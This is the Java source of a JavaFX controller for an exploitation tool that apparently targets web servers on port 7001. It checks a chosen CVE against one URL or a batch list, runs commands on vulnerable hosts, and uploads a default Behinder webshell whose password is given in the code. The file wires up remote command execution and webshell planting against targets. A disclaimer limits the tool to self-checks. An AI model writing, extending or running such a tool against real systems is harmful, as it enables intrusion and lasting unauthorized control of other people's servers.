package com.yhy;

import com.yhy.core.Constants;
import com.yhy.core.ExploitInterface;
import com.yhy.core.Job;
import com.yhy.core.VulInfo;
import com.yhy.tools.Tools;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.text.Text;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.File;
import java.util.HashSet;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

// JavaFX图形化界面的控制类
public class Controller {

    @FXML
    private Label tool_name;
    @FXML
    private Label author;
    @FXML
    private ChoiceBox choice_cve;
    @FXML
    private ChoiceBox encoding;
    @FXML
    private ChoiceBox platform;
    @FXML
    private ChoiceBox thread;
    @FXML
    private Text time;
    @FXML
    private TextArea basic_info;
    @FXML
    private TextArea cmd_info;
    @FXML
    private TextField cmd;

    @FXML
    private TextArea upload_info;
    @FXML
    private TextField upload_path;
    @FXML
    private TextArea upload_msg;
    @FXML
    private TableView<VulInfo> table_view;
    @FXML
    private TableColumn<VulInfo, String> id;
    @FXML
    private TableColumn<VulInfo, String> target;
    @FXML
    private TableColumn<VulInfo, String> isVul;

    private final ObservableList<VulInfo> datas = FXCollections.observableArrayList();
    @FXML
    private TextField url;
    @FXML
    private TextField file_path;

    private ExploitInterface ei;

    // 监听菜单关于事件
    @FXML
    public void about() {
        Alert alert = new Alert(AlertType.NONE);

        // 点 x 退出
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });

        DialogPane dialogPane = new DialogPane();

        TextArea textArea = new TextArea("本工具提供给安全测试人员,安全工程师,进行安全自查使用,请勿非法使用\n\n\n" +
                "版本:\tV0.1\n\n\n" +
                "Bug反馈:\thttps://github.com/yhy0");
        textArea.setEditable(false);
        textArea.setWrapText(true);

        dialogPane.setContent(textArea);


        Image image = new Image(String.valueOf(getClass().getClassLoader().getResource("sec.png")));
        ImageView imageView = new ImageView();
        imageView.setImage(image);

        imageView.setFitWidth(200);
        imageView.setPreserveRatio(true);

        dialogPane.setGraphic(imageView);

        ButtonType confirm = new ButtonType("确认");
        dialogPane.getButtonTypes().setAll(confirm);
        alert.setDialogPane(dialogPane);

        alert.showAndWait();


    }


    // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
    public void defaultInformation() {
        this.choice_cve.setValue(Constants.CVES[0]);
        for (String cve : Constants.CVES) {
            this.choice_cve.getItems().add(cve);
        }

        this.encoding.setValue(Constants.ENCODING[0]);
        for (String coding : Constants.ENCODING) {
            this.encoding.getItems().add(coding);
        }

        this.thread.setValue(10);
        for(int i=1; i<30; i++) {
            this.thread.getItems().add(i);
        }

        // 默认为冰蝎3 的shell
        this.upload_info.setText(Constants.SHELL);
        this.upload_info.setWrapText(true);

        // 命令执行
        this.cmd_info.setText(" ");
        this.cmd_info.setEditable(false);
        this.cmd_info.setWrapText(true);

        this.upload_msg.setText("默认为 冰蝎3 的shell.jspx , 密码：rebeyond");


        this.platform.setValue("Linux");
        this.platform.getItems().add("Linux");
        this.platform.getItems().add("Windows");

        this.time.setText((String.format(this.time.getText(), 0)));

        // 页脚
        this.tool_name.setText(String.format(this.tool_name.getText(), Constants.NAME, Constants.VERSION));
        this.author.setText(String.format(this.author.getText(), Constants.AUTHOR));

    }

    // 基本信息
    public void basic() {
        this.basic_info.setText(Constants.BASICINFO);
        this.basic_info.setEditable(false);
        this.basic_info.setWrapText(true);

    }


    // 点击检测，获取url 和 要检测的漏洞
    @FXML
    public void get_url() {
        String url = this.url.getText().trim();
        String cve = this.choice_cve.getValue().toString().trim();

        if(Tools.checkTheURL(url)) {
            this.ei = Tools.getExploit(cve);

            try {

                if(this.ei.checkVUL(url)) {
                    this.basic_info.setText(url + " 存在 " + cve + "漏洞, \r\n");
                }
            } catch (Exception var4) {
                this.basic_info.setText(url + " 不存在 " + cve + "漏洞 \r\n" + var4.toString());
            }

        } else {
            Tools.alert("URL检查", "URL格式不符合要求，示例：http://127.0.0.1:7001/");
        }

    }

    // 命令执行
    @FXML
    public void get_execute_cmd() {
        String cmd = this.cmd.getText();
        String encoding = this.encoding.getValue().toString().trim();
        if(cmd.length() == 0) {
            cmd = "whoami";
        }

        if(this.ei.isVul()) {
            try {
                String result = this.ei.exeCMD(cmd, encoding);
                this.cmd_info.setText(result);
                System.out.println(result);
            } catch (Exception var4) {
                this.cmd_info.setText(var4.toString());
            }

        }

    }

    // 点击上传文件，获取上传的文件信息
    @FXML
    public void get_shell_file() {

        String shell_info = this.upload_info.getText();
        String upload_path = this.upload_path.getText();
        String platform = this.platform.getValue().toString().trim();


        if(upload_path.length() == 0) {
            upload_path = "test.jspx";
        }

        if(shell_info.length() > 0) {

            if(this.ei.isVul()) {
                try {
                    String web_shell_path = this.ei.uploadFile(shell_info, upload_path, platform);

                    this.upload_msg.setText("文件上传成功！地址：" + web_shell_path);
                } catch (Exception var4) {
                    this.upload_msg.setText(var4.toString());
                }

            } else {
                this.upload_msg.setText("文件上传失败！");
                System.out.println( this.ei.isVul());

            }

        } else {
            Tools.alert("文件上传", "上传的文件不能为空");
        }


    }

    // 双击时复制url
    private void copyString(String str) {
        Clipboard clipboard = Clipboard.getSystemClipboard();
        ClipboardContent content = new ClipboardContent();
        content.putString(str);
        clipboard.setContent(content);
    }

    @FXML
    // url批量导入
    public void batch_test() throws ExecutionException, InterruptedException {
        this.datas.clear();
        Stage stage = new Stage();
        FileChooser fileChooser = new FileChooser();
        FileChooser.ExtensionFilter extFilter = new FileChooser.ExtensionFilter("TXT files (*.txt)", "*.txt");
        fileChooser.getExtensionFilters().add(extFilter);
        File file = fileChooser.showOpenDialog(stage); // 文件路径

        this.file_path.setText(file.toString());

        HashSet<String> values = Tools.read(file.toString(), "UTF-8");

        int i = 0;

        long startTime = System.currentTimeMillis(); //程序开始记录时间

        // 获取用户选择的线程池数量， 创建对应容量的线程池。
        int n = new Integer(this.thread.getValue().toString());

        ExecutorService pool = Executors.newFixedThreadPool(n);

        // 读取每行的目标
        for(String target: values) {
            i++;
            Job t = new Job(target);
            // 线程池
            Future f = pool.submit(t);
            String isVul = f.get().toString();

            this.datas.add(new VulInfo(String.valueOf(i), target, isVul));
        }

        //映射数据进每列
        this.id.setCellValueFactory(new PropertyValueFactory("id"));
        this.target.setCellValueFactory(new PropertyValueFactory("target"));
        this.isVul.setCellValueFactory(new PropertyValueFactory("isVul"));

        // 所有项目添加进datas
        this.table_view.setItems(this.datas);

        long endTime   = System.currentTimeMillis(); //程序结束记录时间
        long totalTime = endTime - startTime;       //总消耗时间 ,毫秒
        this.time.setText((String.format("用时 %s s", (double)totalTime/1000)));

        //双击复制url
        this.table_view.setRowFactory( tv -> {
            TableRow<VulInfo> row = new TableRow<VulInfo>();
            row.setOnMouseClicked(event -> {
                if (event.getClickCount() == 2 && (! row.isEmpty()) ) {
                    VulInfo url = row.getItem();
                    url.getTarget();
                    this.copyString(url.getTarget());
                }
            });
            return row;
        });

    }


    // 加载
    public void initialize() {
        try {
            this.defaultInformation();
            this.basic();
        } catch (Exception var2) {
            var2.printStackTrace();
        }
    }




}
